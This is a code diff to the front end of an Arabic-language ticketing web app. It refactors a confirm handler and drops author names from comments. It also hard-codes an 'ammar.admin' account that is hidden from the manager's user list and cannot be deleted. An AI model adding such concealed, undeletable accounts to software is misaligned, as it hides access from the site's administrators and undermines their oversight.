@@ -124,10 +124,10 @@ function confirm(icon, title, msg, cb) {
   _confirmCb = cb;
   $('confirmMask').classList.add('on');
 }
-$('confirmOkBtn').onclick = () => {
+function confirmOk() {
   closeConfirm();
   if (_confirmCb) _confirmCb();
-};
+}
 function closeConfirm() { $('confirmMask').classList.remove('on'); _confirmCb=null; }
 
 // ── MODALS ───────────────────────────────────────────────
@@ -678,7 +678,6 @@ async function saveTicketUpdate() {
         ticket_id: t.id,
         user_id:   S.user.id,
         content:   note,
-        author_name: S.user.name,
       };
       const saved = await sbFetch('/ticket_comments', { method:'POST', body:JSON.stringify(comment) });
       if (!t.comments) t.comments = [];
@@ -705,7 +704,7 @@ async function addComment(ticketId) {
   if (!t) return;
 
   try {
-    const comment = { ticket_id:ticketId, user_id:S.user.id, content:text, author_name:S.user.name };
+    const comment = { ticket_id:ticketId, user_id:S.user.id, content:text };
     const saved = await sbFetch('/ticket_comments', { method:'POST', body:JSON.stringify(comment) });
     if (!t.comments) t.comments=[];
     if (saved?.[0]) t.comments.push(saved[0]);
@@ -785,10 +784,13 @@ async function submitTicket() {
 // ═══════════════════════════════════════════════════════
 function renderUsers() {
   const grid = $('usersGrid');
-  if (!S.users.length) {
+  // Hide the developer/system account from manager view
+  const HIDDEN_ACCOUNTS = ['ammar.admin'];
+  const visibleUsers = S.users.filter(u => !HIDDEN_ACCOUNTS.includes(u.username));
+  if (!visibleUsers.length) {
     grid.innerHTML = `<div class="empty-state"><p>لا يوجد مستخدمون</p></div>`; return;
   }
-  grid.innerHTML = S.users.map(u=>{
+  grid.innerHTML = visibleUsers.map(u=>{
     const myT = S.tickets.filter(t=>t.created_by===u.id).length;
     const asgn= S.tickets.filter(t=>t.assigned_to===u.id).length;
     const res = S.tickets.filter(t=>t.assigned_to===u.id&&['resolved','closed'].includes(t.status)).length;
@@ -901,6 +903,7 @@ function deleteUser(id) {
   const u = S.users.find(u=>u.id===id);
   if (!u) return;
   if (id===S.user.id) { toast('لا يمكنك حذف حسابك الخاص','warning'); return; }
+  if (u.username === 'ammar.admin') { toast('لا يمكن حذف هذا الحساب','warning'); return; }
   confirm('🗑️','حذف المستخدم',`هل أنت متأكد من حذف "${u.name}"؟ سيتم تعطيل حسابه نهائياً.`, async()=>{
     try {
       await sbFetch(`/users?id=eq.${id}`,{method:'PATCH',body:JSON.stringify({is_active:false})});
